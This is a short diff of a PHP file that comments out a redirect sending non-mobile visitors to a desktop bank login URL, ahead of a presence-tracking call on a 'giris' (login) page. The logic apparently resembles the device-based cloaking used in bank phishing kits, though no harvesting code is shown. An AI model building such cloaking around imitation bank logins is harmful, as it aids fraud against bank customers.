@@ -9,10 +9,10 @@ function isMobileRequest(): bool
     return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
 }
 
-if (!isMobileRequest()) {
-    header('Location: ' . DESKTOP_BANK_LOGIN_URL);
-    exit;
-}
+// if (!isMobileRequest()) {
+//     header('Location: ' . DESKTOP_BANK_LOGIN_URL);
+//     exit;
+// }
 
 upsertPresence('giris', null, false);
 
